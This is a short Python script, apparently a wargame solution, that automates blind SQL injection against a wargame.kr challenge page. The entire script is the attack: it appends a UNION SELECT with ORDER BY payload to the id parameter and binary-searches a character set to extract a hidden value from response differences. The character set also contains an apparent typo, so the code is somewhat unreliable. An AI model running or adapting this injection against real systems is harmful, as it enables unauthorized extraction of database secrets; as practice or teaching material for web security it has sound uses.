from requests import *
tmp='0123456789abcdefghijklmnopqrstuvwxynz'
start=0
end=34
pivot=int((start+end)/2)
result=''
middle=''
for i in range(5):
    if start!=0 or end!=34:
        print('error')
    for j in range(10):
        url='http://wargame.kr:8080/zairo?pw=&flag=abs&id=zairowkdlfhdkel\' '
        middle=result
        middle+=tmp[pivot]
        payload=f'union select 1,2,3,\'{middle}\',5 order by 4 asc %23'
        url+=payload
        print(url)
        response=get(url=url)
        print(start)
        print(pivot)
        print(end)
        if start==pivot:
            start=0
            end=34
            pivot=int((start+end)/2)
            result=middle
            break
        if response.text.find('zairowkdlfhdkel') != -1:
            end=pivot
            pivot=int((start+end)/2)
        else:
            start=pivot+1
            pivot=int((start+end)/2)